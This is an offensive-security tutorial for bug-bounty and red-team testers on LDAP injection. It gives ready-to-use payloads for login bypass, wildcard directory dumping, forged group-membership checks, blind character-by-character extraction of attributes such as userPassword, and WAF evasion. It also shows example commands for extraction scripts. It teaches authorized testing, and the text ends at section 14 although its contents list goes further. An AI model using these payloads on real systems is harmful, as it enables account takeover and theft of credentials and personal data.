# LDAP Injection — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where user input reaches an **LDAP search filter (RFC 4515)** or a **distinguished name / DN (RFC 4514)** — corporate/SSO **login**, "people search" / employee & address-book **directory** lookups, **group-membership / authorization** checks, password-reset "find my account", VPN/appliance auth, printers/MFPs, and any sink calling `ldap_search`/`ldap_bind`/`DirContext.search`/`DirectorySearcher`/`ldap3.Connection.search`
**Backends:** **Active Directory** (LDAP) first-class; **OpenLDAP / 389-DS / ApacheDS / OpenDJ / eDirectory** covered; Kali/WSL for `ldapsearch` & tooling
**Companion files in this folder:**
- `LDAP_INJECTION_ARSENAL.md` — auth-bypass payloads, wildcards, AND/OR breakouts, blind boolean sets, escaping/WAF evasion (copy-paste)
- `LDAP_INJECTION_CHECKLIST.md` — the testing-order checklist you tick per sink
- `LDAP_INJECTION_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (filter fuzzer + AND/OR context detector, blind char-by-char extractor, `ldapsearch` cheat-sheet)

> **Companion to the SQLi · NoSQLi · XPath guides (same query-injection + boolean-blind engine) and the JWT · OAuth-SSO guides (the auth-bypass → ATO outcome).** LDAP injection is the **enterprise-auth killer**: the directory is usually the source of truth for *who you are* and *what you can do*. Unlike SQLi it almost never gives RCE — but it gives the two things that pay just as well: **authentication bypass → log in as admin (ATO)** and **directory disclosure → every user, email, group, and (where readable) password hash.** The mistakes hunters make are (a) treating a returned `*` wildcard as "intended search" and walking away, (b) not detecting the **blind** case (no data, but the response *differs* true-vs-false → extract attributes char-by-char), and (c) escaping at the first WAF instead of routing around it. Read Part II (context + blind) and Part III (impact) — that's where a "login form" becomes a confirmed auth bypass.

---

> ### ⚡ READ THIS FIRST — why LDAP injection pays
> 1. **The prize is AUTH BYPASS, not RCE.** If the login filter is `(&(uid=$user)(userPassword=$pass))` and you can inject `*` / `)(` / `(&)`, you turn the password check into *always-true* and **log in as any user — including admin (Critical ATO)**. That's the headline; everything else supports it.
> 2. **The second prize is the whole directory.** A search/"people-finder" filter that accepts `*` leaks **every user, email, phone, title, manager, group membership** — and on misconfigured servers, readable **`userPassword` / hashes**. Mass PII + cred disclosure = High.
> 3. **AND vs OR context is the whole game.** Your input lands inside `(&(...)(x=INPUT))` (AND) or `(|(...)(x=INPUT))` (OR). The breakout differs. Probe it first (§5/§6) — get the context right and a "filtered" target still falls.
> 4. **Most real LDAP injection is BLIND.** The app won't print directory data. But the response **changes** between a filter that matches and one that doesn't (`uid=admin)(userPassword=a*` vs `…=z*`). That boolean oracle lets you **read attributes one character at a time** (§8/§12) — including data the UI never shows.
> 5. **A WAF/escape is not the end.** `*`→`%2a`, `(`→`%28`, hex `\2a`, double-encoding, the **absolute-true `(&)` / absolute-false `(|)`** filters (RFC 4526), and the **NUL byte `%00`** that truncates the rest of the filter in C-backed servers — these route around naive blacklists (§14).
>
> **Where the money is (memorize this order):** ① **auth bypass → login as admin — Critical/ATO** → ② **authorization/privilege bypass (forge group membership) — High** → ③ **full directory disclosure (all users + hashes) — High** → ④ **blind char-by-char extraction of sensitive attributes — Medium–High** → ⑤ *then* "a `*` returned extra rows" / "`(` caused a 500" as a **lead**, not a finding.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [LDAP-Injection Anatomy — Filters, DNs, AND/OR & Why It Pays](#2-ldap-injection-anatomy)
3. [Reconnaissance — Find Every LDAP Sink](#3-reconnaissance--find-every-ldap-sink)
4. [Baseline — Detect & Classify (error / results / auth / blind; AND vs OR; filter vs DN)](#4-baseline--detect--classify)

**PART II — DETECTION (work in this order)**
5. [Special-Character Probing & Context Detection](#5-special-character-probing--context-detection)
6. [AND vs OR Breakout — the core technique](#6-and-vs-or-breakout--the-core-technique)
7. [Error-Based Detection & Directory Fingerprinting](#7-error-based-detection--directory-fingerprinting)
8. [Blind LDAP Injection (boolean / response-difference)](#8-blind-ldap-injection)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
9. [Authentication Bypass (the headline)](#9-authentication-bypass)
10. [Information Disclosure / Directory Enumeration (wildcards)](#10-information-disclosure--directory-enumeration)
11. [Authorization / Privilege-Escalation Bypass](#11-authorization--privilege-escalation-bypass)
12. [Blind Data Extraction (char-by-char attribute exfil)](#12-blind-data-extraction)
13. [DN Injection & Second-Order](#13-dn-injection--second-order)
14. [Filter / WAF / Escaping Evasion](#14-filter--waf--escaping-evasion)
15. [Active Directory Deep + Red-Team Chains](#15-active-directory-deep--red-team-chains)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
16. [The Validity-First Mindset](#16-the-validity-first-mindset)
17. [False Positives — STOP reporting these](#17-false-positives--stop-reporting-these-auto-reject-list)
18. [Severity Calibration](#18-severity-calibration--how-triagers-really-rate-ldap-injection)
19. [Impact-Escalation Playbooks — "you found X, now do Y"](#19-impact-escalation-playbooks--you-found-x-now-do-y)
20. [Building a Professional, Safe PoC](#20-building-a-professional-safe-poc)
21. [Reporting, CWE/CVSS & De-duplication](#21-reporting-cwecvss--de-duplication)
22. [Automation & Red-Team Notes](#22-automation--red-team-notes)

**Appendices**
- [Appendix A — LDAP-Injection Workflow Cheat Sheet](#appendix-a--ldap-injection-workflow-cheat-sheet)
- [Appendix B — LDAP-Injection Decision Tree](#appendix-b--ldap-injection-decision-tree)
- [Appendix C — LDAP Filter Syntax & Escaping Reference](#appendix-c--ldap-filter-syntax--escaping-reference)
- [Appendix D — Important Links](#appendix-d--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–22) are reference detail; this is the order you execute.

```
PHASE 0  RECON           → find every LDAP-backed feature (login / directory search / group check) + fingerprint AD vs OpenLDAP (§3/§1)
PHASE 1  BASELINE  ★      → send a normal value + ONE * + ONE ( ; classify: error / result-count change / auth diff / silent(blind) (§4)
PHASE 2  DETECT           → special-char probes (§5) → AND-vs-OR context (§6) → error-based + fingerprint (§7) → blind boolean oracle (§8)
PHASE 3  IMPACT  ⭐ (money)→ auth bypass (§9) · directory disclosure via * (§10) · authz/privesc (§11) · blind char-by-char exfil (§12) ·
                            DN/second-order (§13) · AD enumeration → Kerberoast/AS-REP chains (§15)
PHASE 4  EVADE (if WAF)   → %2a / %28 / hex \2a / double-encode · (&) absolute-true · %00 truncation (§14)
PHASE 5  VALIDATE→REPORT  → validity (§16) · false-positive filter (§17) · severity+CVSS+CWE-90 (§18) ·
                            SAFE PoC: own test accounts, benign reads, no mass-dump (§20) · dedup (§21) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate **every** feature that talks to a directory (§3): login, "search people/employees", group/role checks, "forgot username/account", VPN/appliance auth. Fingerprint **AD vs OpenLDAP** from attribute names + errors. *Deliverable:* a list of LDAP sinks + the backend type.
2. **PHASE 1 — Baseline ⭐.** For each sink: a normal value, then a single `*`, then a single `(`. Classify the observable: **error / result-count change / auth difference / silent(blind)** (§4). *Deliverable:* a sink classified by observability.
3. **PHASE 2 — Detect.** Probe special chars (§5), determine **AND vs OR** context (§6), read errors + fingerprint (§7), and if data isn't reflected build a **boolean oracle** (§8). *Deliverable:* confirmed filter-logic manipulation + the context.
4. **PHASE 3 — Impact ⭐.** Escalate: **auth bypass** (§9), **directory disclosure** via `*` (§10), **authorization/privesc** (§11), **blind extraction** (§12), DN/second-order (§13), AD chains (§15). *Deliverable:* demonstrated auth bypass / disclosure / extraction.
5. **PHASE 4 — Evade.** If a filter/WAF blocks `*`/`(`/`)`, route around it (encoding, hex, absolute-true, NUL) (§14). *Deliverable:* a payload that manipulates the filter despite the WAF.
6. **PHASE 5 — Validate → report.** Apply validity & FP filters (§16/§17), set CVSS/CWE-90 (§18), build a *safe* PoC on your own test accounts (§20), de-dup, write it (§21). *Deliverable:* the submitted report.

Reference anytime: payloads → `LDAP_INJECTION_ARSENAL.md`; checklist → `LDAP_INJECTION_CHECKLIST.md`; scripts → `poc/`; playbooks **§19**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper the username/search/group param; replay; the core tool. Intruder for blind char-by-char + auth-bypass payload lists |
| **`poc/ldap_fuzz.py`** | spray special chars + auth-bypass payloads; detect AND/OR context, error-based, and result-count deltas |
| **`poc/ldap_blind.py`** | boolean blind extractor — read an attribute char-by-char through a true/false response oracle |
| **`ldapsearch`** (OpenLDAP client) | direct directory queries once you have a bind (anon or creds) — confirm what an injected filter would return; see `poc/ldapsearch_cheat.md` |
| **`windapsearch` / `ldapdomaindump` / BloodHound** | Active Directory enumeration once you can query (red-team; cross-ref §15) |
| **ffuf / Intruder** | fuzz the special-char + breakout set across many params; charset sweep for blind extraction |
| **nuclei** (`-tags ldap`) | first-pass candidate discovery (always verify by hand) |

```bash
# Kali/WSL
python3 poc/ldap_fuzz.py -u "https://target/search?q=FUZZ"            # context + error + result-count
python3 poc/ldap_blind.py -u "https://target/login" --method POST \
    --data "user=admin&pass=x" --inject user --true "Welcome" \
    --attr userPassword --target-uid admin                            # blind char-by-char
ldapsearch -x -H ldap://dc.target.local -b "dc=target,dc=local" "(uid=*)" # direct query if reachable
```
> **No "sqlmap for LDAP."** There is no universally reliable automated exploiter — LDAP injection is **parser-dependent** (what one server tolerates as trailing filter data, another rejects). So this class is **manual-first**: the `poc/` scripts find candidates and automate the boolean grind, but you confirm the context and the breakout by hand.

> **Windows:** drive Burp on Windows; run the Python `poc/` helpers and `ldapsearch`/`windapsearch` in **WSL/Kali**. For **AD targets**, the high-value attributes are `sAMAccountName`, `userPrincipalName`, `memberOf`, `userAccountControl`, `servicePrincipalName` (§15).

---

# 2. LDAP-Injection Anatomy

## 2.1 What it is
User input is concatenated into an **LDAP search filter** (or a **DN**) and sent to the directory without escaping the LDAP metacharacters. By injecting filter syntax, you **change which entries match** — turning a password check into always-true (auth bypass), widening a search to the whole tree (disclosure), or building a boolean oracle to read attributes (blind extraction). LDAP is a *query* language, not a code/shell surface, so the outcome is **auth/authz bypass and data disclosure**, rarely RCE.

## 2.2 LDAP filter syntax you must know (RFC 4515)
```
(attr=value)            a simple item             (uid=alice)
(&(A)(B))               AND  — all must match     (&(objectClass=user)(uid=alice))
(|(A)(B))               OR   — any may match      (|(uid=alice)(mail=alice@x))
(!(A))                  NOT                        (!(uid=alice))
(attr=*)                PRESENCE / wildcard "any"  (uid=*)  ← matches every entry that HAS uid
(attr=a*b)              substring wildcard          (cn=al*)
(attr>=v) (attr<=v)     ordering                    (uidNumber>=1000)
(attr~=v)               approximate (sounds-like)   (sn~=smyth)
(&)  (|)                ABSOLUTE TRUE / FALSE (RFC 4526)   (&) = matches everything
```
**Metacharacters that MUST be escaped in a value** (RFC 4515 §3) — if they aren't, you can inject:
```
*  →  \2a        (  →  \28        )  →  \29        \  →  \5c        NUL  →  \00
```
**In a DN** (RFC 4514), the special set is different: `, + " \ < > ; =` and leading/trailing space and a leading `#`.

## 2.3 The flavors (decide your technique)
```
FILTER injection (the common one): input lands inside a search filter (...x=INPUT...)  → §5–§12
DN injection:                      input lands inside a Distinguished Name (bind/base DN) → §13
AND context:   (&(fixed)(x=INPUT))   ← you're ANDed with a fixed clause → break out / OR-true     §6
OR context:    (|(fixed)(x=INPUT))   ← you're ORed → a single true clause already wins             §6
```

## 2.4 Observability classes (decide detection)
```
DATA-REFLECTED → the search RESULTS are shown (people-search). Easiest: * dumps the tree.       §10
AUTH-ORACLE    → login succeeds/fails. The "data" is a session. * / (&) → log in as someone.     §9
ERROR-BASED    → a malformed filter throws a visible LDAP error (leaks structure/backend).        §7
BLIND          → no data, no error, but the response DIFFERS true-vs-false → boolean oracle.       §8/§12
```

## 2.5 Where LDAP sinks live (the high-value surface)
```
□ Authentication:  corporate/SSO login, intranet login, VPN & appliance (Citrix/Fortinet/Pulse) auth,
                   "remember me"/SSO bridges, printer/MFP admin, anything backed by AD/OpenLDAP.
□ Directory:       "search people/employees/students", address book, org chart, "find a doctor/agent",
                   admin "user management" search, autocomplete on a name/email field.
□ Authorization:   group/role membership checks ((&(uid=you)(memberOf=admins))), license/seat checks.
□ Account flows:   "forgot username", "find my account", self-service registration uniqueness checks.
□ Code sinks (grep src/JS):
   PHP   ldap_search() ldap_list() ldap_read() ldap_bind() (DN)   — filter built with "."/sprintf
   Java  DirContext.search() / LdapContext / InitialDirContext ; SearchControls ; "...(uid="+u+")"
   .NET  System.DirectoryServices.DirectorySearcher.Filter ; DirectoryEntry path (DN)
   Py    python-ldap search_s() ; ldap3 Connection.search(search_filter=...)
   Node  ldapjs client.search(base,{filter:...})
```

## 2.6 Why it pays
- **Auth bypass = ATO.** The directory authenticates the whole org; bypass it once and you're admin.
- **Mass disclosure.** One `*` can return every employee record (PII) and, on misconfigured servers, password hashes.
- **Authz forgery.** Tamper a membership filter and the app thinks you're in `Domain Admins`.
- **Low bar.** Login and "search" are usually **unauthenticated**, internet-facing, and pre-auth.

> **The mental model:** LDAP injection means **you are editing the directory's question.** You don't run code — you change *which entries match*, and the app trusts the answer for **who you are** and **what you may do.** Severity flows from auth/authz, not RCE.

---

# 3. Reconnaissance — Find Every LDAP Sink

```
□ Login forms:    especially "corporate / staff / employee / partner / student / SSO" logins (AD/OpenLDAP-backed).
□ Search boxes:   "search people / employees / directory / address book / find a <role>"; name/email autocomplete.
□ Group/role UI:  "members of <group>", admin user-management filters, "is this user in <group>?" checks.
□ Account flows:  "forgot username", "find my account", self-service signup "is this username/email taken?".
□ Appliances:     VPN/gateway/printer/MFP/wiki/helpdesk login portals — frequently raw LDAP filter concatenation.
□ Source/JS recon (JS-files kit): grep for ldap_search/DirContext.search/DirectorySearcher/search_filter/ldapjs.
□ Indirect:       a profile field (displayName, description) stored then later used in a group/search filter → second-order (§13).
```
**Fingerprint the backend early** (it changes attribute names and breakouts):
```
Active Directory:  attributes sAMAccountName, userPrincipalName, distinguishedName, memberOf, objectSid,
                   userAccountControl ; base like DC=corp,DC=local ; errors mention "DSID-..." codes.
OpenLDAP/389/etc:  attributes uid, cn, mail, gidNumber, objectClass=inetOrgPerson ; base dc=example,dc=com ;
                   errors mention "javax.naming"/"LDAP: error code 32 - No Such Object" etc.
```
> **If this → then that:** a **login** described as "use your corporate / network / domain credentials" is almost certainly **LDAP/AD-backed** → go straight to auth-bypass probing (§9). A **"search people"** box that returns a list → data-reflected; a single `*` (§10) tells you instantly whether the filter is injectable. A **group/role check** → authorization bypass (§11), often higher-impact than the login.

---

# 4. Baseline — Detect & Classify

**Do this before deep payloads.** Establish observability, context, and backend.

## 4.1 Quick classification probes (send each ALONE, compare to a normal value)
```
Normal value:    q=alice                 → note results / auth result / response length (baseline).
Wildcard:        q=*                      → MORE results than a specific name? → DATA-REFLECTED + injectable (§10).
Open paren:      q=alice(                 → 500 / LDAP error / "javax.naming"? → ERROR-BASED (§7); the ( broke the filter.
Star in login:   user=*  pass=*           → login succeeds / different response? → AUTH-ORACLE injectable (§9).
True vs false:   q=alice)(uid=alice)  vs  q=alice)(uid=nonexistent999)
                                          → response DIFFERS between the two? → BLIND oracle available (§8).
Escaped check:   q=al\2ace  /  q=al*ce    → does * act as wildcard (substring match) or is it escaped to a literal?
```

## 4.2 Determine the context (AND vs OR; filter vs DN)
```
□ Result-widening with )( ...  : q=*)(objectClass=*) returns the whole tree → AND context, breakout works (§6).
□ Single value already enough  : in an OR filter a true clause alone wins; watch for over-matching on one term.
□ Filter vs DN                 : if your input is the USERNAME used to BUILD a bind DN (uid=INPUT,ou=users,dc=..),
                                 LDAP-filter metachars may be escaped but DN metachars (, + = ) may not (§13).
□ Quoted/escaped context       : does the app escape * ( ) \ ? If \2a appears in errors, escaping is on — try DN/second-order/WAF-evasion (§13/§14).
```

## 4.3 Note what you'll need next
- **Backend** (AD vs OpenLDAP) → attribute names, breakouts, AD chains (§15).
- **Observability** → data-reflected (read directly, §10), auth-oracle (§9), error-based (§7), blind (boolean oracle, §8/§12).
- **Context** → AND vs OR (§6); filter vs DN (§13).
- **Filtering?** → which metachars are escaped/blocked → plan evasion (§14).

> **Don't conclude "not vulnerable" from "my `*` returned nothing / an error."** A `*` returning an **error** is often error-based injection (the metachar reached the filter raw). A `*` returning **the same single result** may mean it's escaped — pivot to **DN injection** or **second-order**. Silence on a login usually means **blind** — build the boolean oracle (§8) before walking away.

---

# PART II — DETECTION (work in this order)

> Full payload lists are in `LDAP_INJECTION_ARSENAL.md`.

# 5. Special-Character Probing & Context Detection

Send each metacharacter and watch what changes (results count / error / auth result / response length).
```
*        presence/wildcard        q=*            → widens results (DATA-REFLECTED) or matches-any (AUTH).
(  )     grouping                 q=a(  q=a)     → LDAP error/500 (ERROR-BASED) means the paren reached the raw filter.
&  |     AND/OR                    q=a)(&         → tests whether you can add boolean clauses.
!        NOT                       q=a)(!(uid=a)) → flips logic.
\        escape                    q=a\           → "invalid escape"/error tells you backslash is significant (raw).
=        equality                  q==            → may error or change matching.
%00      NUL truncation            q=a*)%00       → truncates trailing filter in C-backed servers (§14).
```
Confirm with a **logic change you can prove**, not just a reflected char:
```
q=*)(uid=*)         → returns EVERYTHING (vs one row for q=alice)         = filter logic altered (not reflection).
user=*)(uid=*))(|(uid=*  pass=x  → logs you in / different response       = auth filter altered.
```
> **If this → then that:** `(` returns an **LDAP error** → error-based, you're in the raw filter (go to §7 to fingerprint + §6 to break out). `*` returns **more rows** → data-reflected (§10). Neither, but `…)(uid=alice)` vs `…)(uid=nobody)` give **different responses** → blind oracle (§8). Nothing changes at all and `\2a` shows in errors → input is **escaped** → pivot to DN/second-order (§13).

---

# 6. AND vs OR Breakout — the core technique

Where your input lands inside the boolean structure decides the breakout. **Probe the context first** (does `*)(objectClass=*)` widen results?), then use the matching payload.

## 6.1 AND context — `(&(fixed)(attr=INPUT))`
You're ANDed with a fixed clause (e.g. `objectClass=user`, or `userPassword=$pass` in a login). Goal: make the whole thing match anyway.
```
INPUT = *                         → (&(fixed)(attr=*))                     match ANY entry that has attr (widen).
INPUT = *)(objectClass=*)         → (&(fixed)(attr=*)(objectClass=*))      still AND-true → whole tree (disclosure).
INPUT = *))(|(objectClass=*)      → (&(fixed)(attr=*))(|(objectClass=*))   break OUT of the AND group, OR-true the rest
                                                                            (works where the server tolerates a 2nd top-level filter).
INPUT = *))%00                    → (&(fixed)(attr=*))                     NUL truncates the trailing fixed clauses (C servers).
LOGIN (pass check): user=*)(uid=*))(|(uid=*   pass=anything
                                  → (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))   → password clause discarded.
LOGIN simplest:     user=admin)(&)  pass=anything
                                  → (&(uid=admin)(&))(userPassword=anything))   → (&) = absolute-true, pass ignored.
```

## 6.2 OR context — `(|(fixed)(attr=INPUT))`
You're ORed; a **single** true clause already wins, so injection is easier.
```
INPUT = *                         → (|(fixed)(attr=*))                     matches everything with attr.
INPUT = nonexistent)(uid=*)       → (|(fixed)(attr=nonexistent)(uid=*))    your OR clause matches all.
```

## 6.3 The "trailing data" reality (why a payload works on one server, not another)
LDAP libraries differ on whether they accept **a second complete filter after the first**, or **trailing characters** after a balanced filter:
```
TOLERANT (older PHP ldap, some Java/.NET concatenation): )(...  breakouts and %00 truncation WORK.
STRICT   (ldap3, modern bindings that re-parse): the whole string must be ONE valid filter → use * / (&) / extra AND-clauses
         that keep the filter syntactically single and valid, e.g. *)(objectClass=*  inside an existing group.
```
> **If this → then that:** your `)(|(…` breakout returns a *filter syntax error* → the server is **strict**; switch to staying **inside one valid filter**: `*` (presence), `*)(objectClass=*` (extra AND clause), or `admin)(&)` (absolute-true) which most parsers accept as a single grouped filter. If `)(…` **does** work, you have a tolerant backend — full breakout (and `%00` truncation) is on the table.

---

# 7. Error-Based Detection & Directory Fingerprinting

A malformed filter throws an LDAP error — confirmation *and* free fingerprinting.
```
Trigger:   q=alice(        q=alice)        q=alice\        q=*)(            (unbalanced parens / bad escape)
Read it:   the error usually names the backend, the bad filter, sometimes the BASE DN or attribute:
  "javax.naming.directory.InvalidSearchFilterException: invalid attribute description"  → Java/JNDI backend.
  "Bad search filter"  / "ldap_search(): Search: Bad search filter"                      → PHP ldap_*.
  "LDAP: error code 32 - 0000208D: NameErr: DSID-..., problem 2001 (NO_OBJECT) ... 'CN=..,DC=corp,DC=local'"
                                                                                          → Active Directory + leaks BASE DN.
  "System.DirectoryServices.DirectoryServicesCOMException"                               → .NET.
```
> **If this → then that:** an error confirms your metachar reached the **raw filter** (injectable) and the text tells you the **backend** (→ attribute set, §15) and sometimes the **base DN** (which you reuse in `ldapsearch` / blind payloads). AD's `error code 32` / `DSID` strings are a giveaway. Capture the error verbatim for the report — it's strong evidence the input is concatenated unescaped.

---

# 8. Blind LDAP Injection

No data, no error — but the response **differs** depending on whether your injected filter **matches**. That difference is a boolean oracle (status, length, body text, redirect, or login success/fail). Read data through it, like boolean-based SQLi.

## 8.1 Build the oracle (true vs false)
```
TRUE  filter that matches:        q=alice)(uid=alice)            → "found"/200/longer body/login OK.
FALSE filter that can't match:    q=alice)(uid=zzz_nope_999)     → "not found"/different length/login fail.
Confirm the difference is STABLE and tied to match/no-match (repeat a few times to exclude noise).
```

## 8.2 Existence / presence tests (cheap, high-signal)
```
Does attribute exist on an entry?   (&(uid=admin)(ATTR=*))   → true if admin has ATTR (probe userPassword, mail, memberOf…).
Does a user exist?                  (&(uid=USERNAME)(objectClass=*))  vs a bogus name → username enumeration.
Is admin in a group?                (&(uid=admin)(memberOf=CN=Domain Admins,...))  → true/false (authz recon).
```

## 8.3 Char-by-char attribute extraction (the payoff)
Use substring wildcards to binary-/linear-search each character of a target attribute:
```
First char of admin's password attr is 'a'?   (&(uid=admin)(userPassword=a*))   → TRUE branch?
                                               (&(uid=admin)(userPassword=b*))   → iterate the charset…
Once 'a' confirmed, grow the prefix:           (&(uid=admin)(userPassword=ab*))  → next char…
Speed it up: range with >=/<= to binary-search:(&(uid=admin)(userPassword>=m*))  → halves the charset per request.
```
`poc/ldap_blind.py` automates this against your true/false oracle. **Readable targets** vary by server config: `userPassword` is often *not* readable, but `mail`, `employeeID`, `description`, `telephoneNumber`, `sAMAccountName`, security answers, and custom attributes frequently are — and that's still sensitive disclosure.

> **If this → then that:** login/search shows **no directory data** but `…)(uid=alice)` vs `…)(uid=nobody)` give **reliably different responses** → you have a **blind oracle = confirmed LDAP injection**. Prove impact by extracting a *few* characters of a benign attribute (e.g. your own test user's `mail`) with `ldap_blind.py` — you do **not** need to dump the whole directory to prove the bug (§20).

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC uses **your own test accounts**, benign reads, and **no mass data dump** (§20). The finding is **altered filter logic with a concrete impact** (auth bypass / disclosure / extraction), not a reflected `*`.

# 9. Authentication Bypass

The headline. Login filters are usually `(&(uid=$user)(userPassword=$pass))` (AND) — turn the password clause into always-true.
```
KNOWN username, bypass password:
  user = admin)(&)            pass = anything   → (&(uid=admin)(&))(userPassword=anything))   (&) absolute-true.
  user = admin)(|(uid=*       pass = anything   → OR-true; logs in as admin (tolerant backends).
  user = admin*               pass = anything   → if the app binds the first match & password is wildcardable.
UNKNOWN username (log in as "first/any" user — often the admin/first OU entry):
  user = *)(uid=*))(|(uid=*   pass = anything
  user = *                    pass = *          → both wildcarded → first matching entry.
  user = *)(|(objectClass=*)  pass = anything
PASSWORD field injection (some apps put pass in the filter too):
  pass = *                    → (&(uid=admin)(userPassword=*))  → presence-only → matches if userPassword exists.
NUL truncation (C-backed):
  user = admin)(uid=admin))%00   pass = ignored  → trailing password clause truncated.
```
**Why it works:** the app does an LDAP **search** with the filter, and if **≥1 entry matches**, it treats the login as successful (and often binds *as the returned DN* or just issues a session). By forcing a match without the real password, you authenticate.
> **If this → then that:** `user=admin)(&)` (or `*)(uid=*))(|(uid=*`) **logs you in** → **authentication bypass**; if the account you land on is **admin/privileged → Critical ATO**, otherwise High. Confirm with a *benign* signal (you reach the post-login page / your own test-admin account) — **do not** rummage through a real user's data to "prove" it (§20). Note *which* account you land on (the first OU entry is frequently a service or admin account).

---

# 10. Information Disclosure / Directory Enumeration

When search **results are reflected**, a wildcard turns a name-lookup into a directory dump.
```
WIDEN one term:        q=*                         → every entry that has the searched attr.
WIDEN + force-all:     q=*)(objectClass=*)         → whole subtree (AND-true).  q=*)(cn=*)
TARGET attributes:     if the UI shows only name, the FILTER may still match on hidden attrs — pull more by matching them:
                       q=*)(mail=*)   q=*)(telephoneNumber=*)   q=*)(memberOf=*)   q=*)(userPassword=*)  (if readable!)
ENUMERATE specific:    q=admin*    q=a*  b*  c* …  → harvest usernames/emails alphabetically if results are capped.
PORTSWIGGER-style:     a "search" for `*` returning all users is the canonical lab PoC.
```
**The high-value reads:** full **user list** (PII: name, email, phone, title, manager, department), **group memberships** (`memberOf` → who's admin), and — on misconfigured directories that expose it — **`userPassword`** (hashes) or custom secret attributes.
> **If this → then that:** `q=*` returns **many more entries than a specific search** → directory disclosure; quantify it (e.g. "returns all N users incl. emails"). If the response includes **`memberOf`/group** data → you've also mapped the privilege graph (feed §11/§15). If `…)(userPassword=*)` returns entries → **readable password hashes = High/Critical disclosure.** For the report, demonstrate with a *bounded* read (a handful of records), not the full dump (§20).

---

# 11. Authorization / Privilege-Escalation Bypass

Often higher-impact than the login: many apps gate features with an LDAP **membership check** like `(&(uid=$you)(memberOf=CN=Admins,...))`. If `$you` is injectable, forge the answer.
```
Make the membership check always-true:
  uid = you)(memberOf=*           → (&(uid=you)(memberOf=*))                 you "have" some group → maybe enough.
  uid = you)(|(memberOf=*)        → OR-true the membership clause.
  uid = *)(memberOf=CN=Admins,... → match the admins group regardless of you.
  uid = you)(&)                   → (&) absolute-true → check passes.
Flip a NOT-based deny check:
  if the app uses (!(memberOf=CN=Banned,...)) → inject to break the NOT or add an always-true sibling.
```
> **If this → then that:** a feature/route is gated by an **LDAP group check** and the user identifier is injectable → forge the membership filter to **always-true** (`)(memberOf=*` / `)(&)`) → **privilege escalation / authorization bypass** (access admin functions without being in the group). This is frequently **High** even when the login itself is safe — test group/role checks separately from the login (§3).

---

# 12. Blind Data Extraction

When nothing is reflected, exfiltrate through the boolean oracle (§8) one character at a time.
```
ORACLE:   TRUE  → q=...)(uid=alice)          (matches → "found"/200/length A)
          FALSE → q=...)(uid=nobody999)      (no match → "not found"/length B)
EXTRACT:  for each position, test (&(uid=TARGET)(ATTR=<prefix><char>*)) until the TRUE branch fires; append; repeat.
          binary-search with >= / <= to cut requests ~log2(charset).
TOOL:     python3 poc/ldap_blind.py -u "<oracle URL>" --true "<true marker>" \
              --attr mail --target-uid <your-test-user>
LIMITS:   you can only read attributes the bound identity is permitted to read; rate is ~1 attribute char per few requests
          (pace it, §22). Prove the bug by extracting a few chars of a benign attribute on YOUR test account — not a mass dump.
```
> **If this → then that:** a confirmed blind oracle → extract a **short, benign** value (your own test user's `mail`, or `objectClass`) to prove read access, then **stop and report**. Mass-extracting real users' attributes adds legal/operational risk without adding bounty — the oracle + a small proof is already a valid High finding (§20).

---

# 13. DN Injection & Second-Order

## 13.1 DN injection
Sometimes input isn't in the *filter* — it's concatenated into a **Distinguished Name** (the bind DN or base DN), e.g. `uid=$user,ou=people,dc=corp,dc=local`. The DN special set (RFC 4514: `, + " \ < > ; =`) differs from the filter set, so a filter-escaped app may still be DN-injectable.
```
BASE-DN injection (change the search root):  user = x,ou=admins   → uid=x,ou=admins,ou=people,dc=corp,dc=local
                                             → redirects the search/bind into a different OU.
RDN tricks:                                  values with , or + can split into extra RDN components.
```
> **If this → then that:** the app escapes `*`/`(`/`)` (filter-safe) but your username is used to **build a DN** → test the **DN** metacharacters (`,` `+` `=` `\`). A `,` that changes the OU/base the bind/search uses → DN injection (auth/scope manipulation). Less common than filter injection but bypasses filter-only escaping.

## 13.2 Second-order
Your input is **stored** (a profile `displayName`, `description`, group name) and later concatenated into a filter by a *different* feature (an admin search, a sync job, a group resolver).
```
Plant:  set your displayName / description to  *)(objectClass=*   (or a benign uid-matching marker).
Watch:  trigger the consuming feature (admin user search, directory sync, group recompute) → does the filter break / widen?
```
> **If this → then that:** a stored profile field later feeds a filter (admin search, sync) → second-order LDAP injection in the **consuming** feature, often running with **higher privileges** than your session. Plant a benign marker, trigger the consumer, observe the logic change.

---

# 14. Filter / WAF / Escaping Evasion

A WAF or naive blacklist blocks `*`/`(`/`)`; route around it.
```
URL-ENCODE:        *→%2a   (→%28   )→%29   \→%5c   &→%26   |→%7c   =→%3d   NUL→%00
DOUBLE-ENCODE:     *→%252a   (→%2528           (when one decode layer happens before the filter)
LDAP HEX ESCAPE:   \2a (=*)  \28 (=()  \29 (=))  \5c (=\)   — sometimes UN-escaped into the metachar by the app.
ABSOLUTE TRUE/FALSE (RFC 4526): (&) matches everything, (|) matches nothing — tiny, often un-blacklisted.
NUL TRUNCATION:    append %00 to cut the rest of the filter (C-backed servers) — defeats trailing fixed clauses.
CASE / ATTR ALIASING (AD): attribute names are case-insensitive and have aliases (sAMAccountName/sAMAccountname,
                   cn/commonName) — vary them past keyword filters.
WHITESPACE/UNICODE: some filters trim/normalise; try leading/trailing spaces, full-width characters where the
                   directory normalises but the WAF doesn't.
SPLIT THE TOKEN:   if "objectClass" is blocked, use a different always-present attr (cn, uid, objectCategory).
```
